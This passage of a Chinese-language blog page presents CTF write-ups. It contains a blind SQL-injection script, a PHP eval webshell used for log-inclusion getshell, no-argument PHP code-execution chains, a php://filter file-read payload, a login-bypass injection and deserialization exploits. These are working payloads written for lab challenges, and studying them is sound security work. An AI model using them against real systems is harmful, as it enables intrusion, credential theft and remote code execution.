class="string">""</span><span class="string">"or ascii(substr((select group_concat(`2`) from (select 1,2 union select * from users)a),&#123;&#125;,1))&gt;&#123;&#125;%23"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">            url=url1+payload</span><br><span class="line">            p=requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> (len(p.text)!=0):</span><br><span class="line">                n=1</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                n=0</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">""</span><span class="string">"or ascii(substr((select group_concat(`2`) from (select 1,2 union select * from users)a),&#123;&#125;,1))=&#123;&#125;%23"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">            url=url1+payload</span><br><span class="line">            p=requests.get(url)</span><br><span class="line">            m=int(m)</span><br><span class="line">            <span class="keyword">if</span> (len(p.text)!=0):</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m+1)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<p>因为过滤了单引号，双引号加了反斜杠，所以无法注出列名，这里用无列名注入，select 1,2 改变列数测出有两列<br>自己写了个二分法，每一位都要判断8次，之前记得有个判断7次就可以的，忘了怎么写的233<br>还有buu的429，大概延迟0.15就可，用跑出来的账号密码登陆<br>admin e2d32fe680e523c28c67<br>文件上传，先随便上传一个jpg文件试试，上传之后给了一个日志文件，包含了文件名，这里想到用包含文件名利用日志getshell<br>过滤了php这个词，所以用短标签<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cop'</span>]);?&gt;</span><br></pre></td></tr></table></figure></p>
<p>phpinfo可以，奇怪的是直接执行命令不行，看了下也没禁用system啊233，菜刀连一下flag在根目录<br>后来想到可能是因为没输出加个@应该就行了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/php无参数命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/php无参数命令执行/" itemprop="url">php无参数命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T18:40:27+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="gxy禁止套娃"><a href="#gxy禁止套娃" class="headerlink" title="gxy禁止套娃"></a>gxy禁止套娃</h2><p>之前没来的及看这道题，现在来buu复现一下<br>打开没看到什么提示，想着扫一下目录，但是扫buu直接429了，直接看wp去了<br>git泄露出index.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z|\-]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|info|dec|bin|hex|oct|pi|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'exp'</span>];</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></p>
<p>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br>得到文件名可以用scandir()函数扫描当前目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'.'</span>));</span><br></pre></td></tr></table></figure></p>
<p>得到 .<br>1.chr(46)<br>得到46有三种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chr(rand()) </span><br><span class="line">chr(time())</span><br><span class="line">chr(current(localtime(time())))</span><br></pre></td></tr></table></figure></p>
<p>前两种看人品，最后一种localtime(time())的返回一个数组，Array[0]为一个0~60之间的数字，每秒加1，所以最多一分钟就可以得到46。由于<br>php数组内部指针默认指向第一个元素，所以current()或pos()取数组中当前元素的值，就得到了这个数字。<br>操作数组的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">end() – 将内部指针指向数组中的最后一个元素，并输出 </span><br><span class="line">next() – 将内部指针指向数组中的下一个元素，并输出 </span><br><span class="line">prev() – 将内部指针指向数组中的上一个元素，并输出 </span><br><span class="line">reset() – 将内部指针指向数组中的第一个元素，并输出 </span><br><span class="line">each() – 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure></p>
<p>2.current(localeconv())<br>localeconv() 函数返回一包含本地数字及货币格式信息的数组，current(localeconv())永远都是个点</p>
<p>3.phpversion()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phpversion()返回php版本，如7.3.5 f</span><br><span class="line">loor(phpversion())返回7 </span><br><span class="line">sqrt(floor(phpversion()))返回2.6457513110646 </span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615 </span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491 </span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156 </span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46 </span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回. </span><br><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录 </span><br><span class="line">next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..</span><br></pre></td></tr></table></figure></p>
<p>4.crypt()<br>原文链接 <a href="https://www.jianshu.com/p/060d16584b8e" target="_blank" rel="noopener">https://www.jianshu.com/p/060d16584b8e</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(<span class="built_in">chdir</span>(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))); </span><br><span class="line">原理：hebrevc(crypt(arg))可以随机生成一个<span class="built_in">hash</span>值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符 </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">chdir</span>(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); </span><br><span class="line">原理：crypt(serialize(array())) 原因同上</span><br></pre></td></tr></table></figure></p>
<p>现在可以构造payload扫描当前目录了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/pUf8YWpzglkWFuwV.png!thumbnail" alt><br>可以看到flag.php在数组的第四个元素<br>1.用array_reverse()可以以相反元素的顺序返回数组，这样就可以用next()获取flag.php了</p>
<p>2.array_rand(array_flip())<br>array_flip()交换数组的键和值 ?exp=print_r(array_flip(scandir(current(localeconv()))));<br><img src="https://uploader.shimo.im/f/fs7XJqwI1ho4TLRw.png!thumbnail" alt><br>array_rand() 函数返回数组中的一个随机键名，或者如果指定函数返回键名不只一个，则返回一个包含随机键名的数组，不断刷新访问就会不断<br>随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php<br>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));<br><img src="https://uploader.shimo.im/f/umn6kc8eNa86Omp2.png!thumbnail" alt></p>
<p>3.session_id(session_start())<br>sky师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E5%9B%9B%EF%BC%9Asession-id" target="_blank" rel="noopener">文章</a>里介绍了这种方法<br>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身<br>就支持的。 使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。 session_id()可以获取到当前<br>的session id。 手动设置名为PHPSESSID的cookie，并设置值为flag.php<br>?exp=print_r(session_id(session_start()));<br><img src="https://uploader.shimo.im/f/7wkXxVt7Yn8Pvkub.png!thumbnail" alt></p>
<p>下面就是读flag.php了，因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函<br>数show_source()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv())))))); <span class="comment">#f12看源码，去掉print_r也可以读文件</span></span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure></p>
<p>最后附上这位师傅的<a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">博客</a>，思路完全是跟着这位师傅来的，而且他的总结也很完整，每一<br>步的方法都很多，我基本就是复制原博文了2333，学到了很多</p>
<h2 id="ByteCTF-Boringcode"><a href="#ByteCTF-Boringcode" class="headerlink" title="ByteCTF Boringcode"></a>ByteCTF Boringcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$code</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, NULL, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>url有个正则是末尾要baidu.com，这个直接买个域名就行了<br>然后这个和上面那个不同的是不能有下划线，那只能用readfile读文件了<br>这里还有一个不同点是flag文件在上一级目录，要用chdir函数改变目录<br>贴上几个payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chdir</span>(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"><span class="comment"># 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>(readfile(end(scandir(chr(pos(localtime(time(<span class="built_in">chdir</span>(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"><span class="comment"># 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>(readfile(end(scandir(chr(pos(localtime(time(<span class="built_in">chdir</span>(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br><span class="line"><span class="comment"># 同样的原理，不过生成chr(46)的方式不同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#time()返回时间戳，有没有参数无关</span></span><br></pre></td></tr></table></figure></p>
<h2 id="2019上海市大学生网络安全大赛-decade"><a href="#2019上海市大学生网络安全大赛-decade" class="headerlink" title="2019上海市大学生网络安全大赛_decade"></a>2019上海市大学生网络安全大赛_decade</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, NULL, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"invalid"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"invalid"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这道题和ByteCTF Boringcode类似，不过过滤的函数比较多<br>首先readflie被过滤了，fuzz一下，php中类似readfile的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(get_defined_functions());?&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现readgzfile这个函数，看一下函数的定义<br><img src="http://static.zybuluo.com/Pdsdt/5lrnzi0t6xvixel5it4a97q7/image.png" alt><br>主要是读取一个压缩文件，不过在本地测试时发现，该函数也可以实现readfile的功能去读取文件</p>
<p>然后是如何得到. 做gxy的时候.有四种方法可以得到，这道题过滤了rand time local sqrt，只能用第四种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chr(ord(hebrevc(crypt(phpversion()))))</span><br><span class="line">或</span><br><span class="line">chr(ord(strrev(crypt(serialize(array())))))</span><br><span class="line">因为crypt的随机性，所以要多刷新几次</span><br></pre></td></tr></table></figure></p>
<p>然后就可以用配合readgzfile读flag文件了</p>
<h2 id="极客大挑战——Eval-evil-code"><a href="#极客大挑战——Eval-evil-code" class="headerlink" title="极客大挑战——Eval evil code"></a>极客大挑战——Eval evil code</h2><p>这道题因为没有做过滤，所以可以getshell<br>命令写在head头的最后一行 格式为一个冒号加命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(end(getallheaders()));</span><br></pre></td></tr></table></figure></p>
<p>详情参考这位师傅<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#Eval_evil_code" target="_blank" rel="noopener">博客</a><br>这道题也可以用eval(hex2bin(session_id(session_start()))) 包含session来getshell</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/19/极客大挑战刷题记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/19/极客大挑战刷题记录/" itemprop="url">极客大挑战刷题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-19T23:32:27+08:00">
                2020-01-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>一个登陆框，f12没看到什么特殊的东西，admin 123456 登陆一下，提示username or password错误<br>简单测试username处存在注入，直接万能密码?username=admin’ or 1%23&amp;password=12345 登陆成功</p>
<h2 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h2><p>f12找到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">           <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br></pre></td></tr></table></figure></p>
<p>直接?cat=dog 出flag了。。</p>
<h2 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h2><p>wp说是有个跳转，我是没看到啥跳转，开着bp也没抓到跳转包。。<br>/secr3t.php给出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>); </span><br><span class="line">//flag放在了flag.php里</span><br></pre></td></tr></table></figure></p>
<p>伪协议直接读，payload:?file=php://filter/convert.base64-encode/resource=flag.php</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>提示备份网站，<a href="http://www.zip下载源码" target="_blank" rel="noopener">www.zip下载源码</a><br>index.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">'class.php'</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">'select'</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private <span class="variable">$username</span> = <span class="string">'nonono'</span>;</span><br><span class="line">    private <span class="variable">$password</span> = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$username</span>,<span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;password != 100) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;username;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;password;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            global <span class="variable">$flag</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简单的反序列化，exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private <span class="variable">$username</span> ;</span><br><span class="line">    private <span class="variable">$password</span> ;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$username</span>,<span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new Name(<span class="string">"admin"</span>,100);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:4:<span class="string">"Name"</span>:2:&#123;s:14:<span class="string">"Nameusername"</span>;s:5:<span class="string">"admin"</span>;s:14:<span class="string">"Namepassword"</span>;i:100;&#125;</span><br><span class="line">url输出 </span><br><span class="line">O%3A4%3A<span class="string">"Name"</span>%3A3%3A%7Bs%3A14%3A<span class="string">"%00Name%00username"</span>%3Bs%3A5%3A<span class="string">"admin"</span>%3Bs%3A14%3A<span class="string">"%00Name%00password"</span>%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure></p>
<p>wakeup的绕过还有属性的坑<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造序列化对象：O:5:<span class="string">"SoFun"</span>:1:&#123;S:7:<span class="string">"\00*\00file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line">绕过__wakeup：O:5:<span class="string">"SoFun"</span>:2:&#123;S:7:<span class="string">"\00*\00file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line"></span><br><span class="line">protect属性  属性\00*\00</span><br><span class="line">private   %00类名%00属性</span><br></pre></td></tr></table></figure></p>
